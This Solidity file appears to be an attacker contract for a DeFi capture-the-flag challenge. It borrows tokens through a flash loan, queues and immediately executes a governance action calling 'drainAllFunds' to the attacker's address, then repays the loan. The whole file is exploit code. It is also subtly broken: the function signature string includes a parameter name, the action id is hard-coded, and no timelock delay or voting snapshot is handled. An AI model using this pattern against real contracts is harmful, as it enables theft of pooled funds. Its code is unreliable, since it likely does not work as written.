// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address, uint256) external;
}

interface IFlashLoan {
    function flashLoan(uint256 amount) external;
}

interface Governance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

contract Attacker {
    address governance;

    constructor(address governanceP) {
        governance = governanceP;
    }

    event Happened(string);

    function requestFlashLoan(address flashLoanContract, uint256 amount)
        public
    {
        emit Happened("DUHDUHDUDH");

        IFlashLoan(flashLoanContract).flashLoan(amount);
    }

    function receiveTokens(address a, uint256 borrowAmount) public {
        Governance(governance).queueAction(
            address(this),
            abi.encodeWithSignature(
                "drainAllFunds(address receiver)",
                address(this)
            ),
            0
        );
        Governance(governance).executeAction(0);
        IERC20(a).transfer(msg.sender, borrowAmount);
    }
}
